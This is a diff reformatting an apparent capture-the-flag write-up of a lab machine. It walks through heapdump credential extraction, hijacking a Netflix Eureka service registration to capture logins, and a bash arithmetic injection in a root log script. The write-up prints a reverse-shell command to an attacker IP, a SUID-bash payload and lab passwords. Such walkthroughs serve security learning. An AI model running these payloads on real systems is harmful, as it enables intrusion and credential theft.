@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```
+```
 nmap -sV -sC -vv 10.10.11.66
 nmap -sU --top-ports=10 -vv 10.10.11.66
 
@@ -31,7 +31,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## Directory Enumeration
 - Gobuster:
 	- Directory
-		```
+```
 gobuster dir -u http://furni.htb dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 
 ---OUTPUT---
@@ -49,8 +49,8 @@ gobuster dir -u http://furni.htb dns --wordlist /usr/share/wordlists/dirbuster/d
 /error                (Status: 500) [Size: 73]
 /http%3A%2F%2Fwww     (Status: 400) [Size: 435]
 ```
-		- Next Directory
-			```
+- Next Directory
+```
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -u http://furni.htb
 
 ---OUTPUT---
@@ -81,21 +81,21 @@ Finished
 ```
 - I find heapdump file exploring these subdirectories
 - On playing around with it i find creds with :
-	```
+```
 strings headpdump | grep "password"
 
 ---OUTPUT---
 {password=0sc@r190_S0l!dP@sswd, user=oscar190}!
 ```
-	- Also used grep -i and it gave the output but this was more easy to find as lesser data
+- Also used grep -i and it gave the output but this was more easy to find as lesser data
 - Can ssh into machine
-	```
+```
 ssh oscar190@10.10.11.66
 > 0sc@r190_S0l!dP@sswd
 ```
 - Don't find much but if we remember there was a another port shown in our nmap that also asked for login credentials.
 - We check ps -ax to see where it is being hosted:
-	```
+```
 netstat| grep "8761"
 
 
@@ -110,15 +110,15 @@ tcp6       0      0 eureka:57128            eureka:8761             ESTABLISHED
 # Earlier I also saw:
 tcp        0      0 localhost:59612         localhost:8761          ESTABLISHED
 ```
-	- We check /etc/hosts to find eureka
-		```
+- We check /etc/hosts to find eureka
+```
 cat /etc/hosts
 
 ---OUTPUT--
 127.0.0.1 localhost eureka furni.htb
 ```
-		- We search for 8761 in heapdump:
-			```
+- We search for 8761 in heapdump:
+```
 strings heapdump| grep "8761"
 
 ---OUTPUT---
@@ -130,15 +130,15 @@ Host: localhost:8761
 http://localhost:8761/eureka/!
 Host: localhost:8761
 ```
-	- We check credentials by logging in via the port in 10.10.11.66
-		- Credentials work
+- We check credentials by logging in via the port in 10.10.11.66
+	- Credentials work
 			![Pasted image 20250429180149.png](../Attachments/Pasted%20image%2020250429180149.png)
 - On searching online we see (and also I remember seeing a "netflix" during my enumeration) that it is park of netflix eureka integrated into springboot (https://cloud.spring.io/spring-cloud-netflix/reference/html/)
 	- I find this that talks about exploiting it:
 		- https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka/
-			- ![Pasted image 20250429180440.png](../Attachments/Pasted%20image%2020250429180440.png)
+![Pasted image 20250429180440.png](../Attachments/Pasted%20image%2020250429180440.png)
 		- I copy the above content to burpsuite (first i capture the login packet of the site and paste this as a POST request) ( i also encode credentials to base64)
-			```
+```
 POST /eureka/apps/USER-MANAGEMENT-SERVICE HTTP/1.1
 Accept: application/json, application/*+json
 Accept-Encoding: gzip
@@ -156,16 +156,15 @@ Content-Length: 433
     "secureVipAddress": "USER-MANAGEMENT-SERVICE",
 "overriddenStatus":"UNKNOWN","port":{"$":8083,"@enabled":"true"}}}
 ```
-	- I turn on netcat and get some credentials:
-	- 
+- I turn on netcat and get some credentials:
 - Alternatively I can tunnel localhost and pass the command or use curl with credentials:
-	```
+```
 ~C
 -L 8761:127.0.0.1:8761
 ```
-	- Log into target via localhost:8761
+- Log into target via localhost:8761
 - Then I try to pass the command again (using curl this time but only difference is in POST request we change Host to localhost:8761)
-	```
+```
 curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
   "instance": {
     "instanceId": "USER-MANAGEMENT-SERVICE",
@@ -187,9 +186,9 @@ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER
 }
 '
 ```
-	- And have net cat listening on port
+- And have net cat listening on port
 - For both methods we can a response in netcat:
-	```
+```
 nc -lvnp 8083
 
 ---OUTPUT---
@@ -213,38 +212,38 @@ host: 10.10.14.25:8083
 
 username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=ZjjlHICht4yCy5QqAqRaT3XeXrbDNfZATYXriUAzfITneORZUQnRKLmXgLqvqfZLZ4luLRDpc46nDcZtKLWP6yNXS7XfS9No
 ```
-	- We get credentials
+- We get credentials
 - We ssh into machine with credentials:
-	```
+```
 ssh miranda.wise@10.10.11.66
 >IL%21veT0Be%26BeT0L0ve
 ```
-	- It fails
-	- I check from oscar190's account in the /home directory and find a folder miranda-wise. I use this as username
-		```
+- It fails
+- I check from oscar190's account in the /home directory and find a folder miranda-wise. I use this as username
+```
 oscar190@eureka:~/.local/share/nano$ ls /home
 
 ---OUTPUT---
 miranda-wise  oscar190
 ```
-	- I try to ssh again
-		```
+- I try to ssh again
+```
 ssh miranda-wise@10.10.11.66
 >IL%21veT0Be%26BeT0L0ve
 ```
-		- It still fails. Looking at the pwd it looks URL encoded. I decode it with Burp (just pasted in request, selected text and pressed Ctrl+Shift+U)
-			```
+- It still fails. Looking at the pwd it looks URL encoded. I decode it with Burp (just pasted in request, selected text and pressed Ctrl+Shift+U)
+```
 IL!veT0Be&BeT0L0ve
 ```
-	- I try to ssh again and it works this time:
-		```
+- I try to ssh again and it works this time:
+```
 ssh miranda-wise@10.10.11.66
 >IL!veT0Be&BeT0L0ve
 ```
 ## Privilege Escalation
 - Looking around there's not much, can't do sudo commands, no etuid privileges...
 - I pass ps -ax and find some scripts being passed:
-	```
+```
 ps -ax
 
 ---RELEVANT-OUTPUT---
@@ -253,7 +252,7 @@ ps -ax
  
 ```
 - I check /opt and find a script ( can't access further than /opt):
-	```
+```
 ls /opt
 
 ---OUTPUT---
@@ -265,7 +264,7 @@ drwxrwx---  2 root www-data 4096 Aug  7  2024 heapdump
 drwxr-x---  2 root root     4096 Apr  9 18:34 scripts
 ```
 - Reading the script we find something interesting:
-	```
+```
 cat log_analyse.sh
 
 ---RELEVANT-OUTPUT---
@@ -289,37 +288,37 @@ analyze_http_statuses() {
 }
 
 ```
-	- We see `if [ "$existing_code" -eq "$code" ](%20"$existing_code"%20-eq%20"$code"%20); then` is an arithmetic operation
-		- Reference: https://dev.to/greymd/eq-can-be-critically-vulnerable-338m
-		- In bash it will execute whatever is in (...) for the arithmetic operation first. 
-		- In an arithmetic context, anything inside $(...) or backticks will be executed, even if the overall expression fails.
-			- For example:
-				```
+- We see `if [ "$existing_code" -eq "$code" ](%20"$existing_code"%20-eq%20"$code"%20); then` is an arithmetic operation
+	- Reference: https://dev.to/greymd/eq-can-be-critically-vulnerable-338m
+	- In bash it will execute whatever is in (...) for the arithmetic operation first. 
+	- In an arithmetic context, anything inside $(...) or backticks will be executed, even if the overall expression fails.
+		- For example:
+```
 num="[$(echo gotcha)]"
 [ 5 -eq $num ](%205%20-eq%20$num%20)
 ```
-				- This will:
-					- Run echo gotcha and capture the result ([gotcha]).
-					- Try to evaluate 5 -eq [gotcha], which obviously fails.
-					- But step 1 already executed, so the damage is done.
-				- Bash sees $(...) as part of a value it's trying to convert to a number, and evaluates it before checking whether it’s actually a valid number.
-					- So if someone does:
-						```
+- This will:
+	- Run echo gotcha and capture the result ([gotcha]).
+	- Try to evaluate 5 -eq [gotcha], which obviously fails.
+	- But step 1 already executed, so the damage is done.
+- Bash sees $(...) as part of a value it's trying to convert to a number, and evaluates it before checking whether it’s actually a valid number.
+	- So if someone does:
+```
 code="[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]"
 if [ 200 -eq $code ](%20200%20-eq%20$code%20); then ...
 ```
-						- The cp and chmod will run immediately, even though $code isn't a number and the comparison fails.
+- The cp and chmod will run immediately, even though $code isn't a number and the comparison fails.
 - So we Find a log file we can change and add the details for code with our exploit:
 	- We can find logs in /var/www/web/cloud-gateway/log OR /var/www/web/user-management-service/log/
-		```
+```
 rm application.log 
 > y
 echo 'HTTP Status: x[$(bash -c "bash -i >& /dev/tcp/10.10.14.25/9999 0>&1")]' >> application.log
 --OR--
 echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]' >> application.log
 ```
-		- If we used the first command we turn on netcat listener and eventually we get reverse shell:
-			```
+- If we used the first command we turn on netcat listener and eventually we get reverse shell:
+```
 nc -lvnp 9999
 
 ---OUTPUT---
@@ -330,8 +329,8 @@ bash: no job control in this shell
 root@eureka:~# whoami
 root
 ```
-	- If second command, after some time we should find a bash executable in /tmp
-		```
+- If second command, after some time we should find a bash executable in /tmp
+```
 cd /tmp
 ./bash -p
 bash-5.0# whoami
@@ -339,8 +338,8 @@ bash-5.0# whoami
 ---OUTPUT--
 root
 ```
-	- We can grab root flag
-	- Tried to initially copy ssh file but it didn't work. On searching as root we see that file doesn't exit
+- We can grab root flag
+- Tried to initially copy ssh file but it didn't work. On searching as root we see that file doesn't exit
 
 -------
 --------
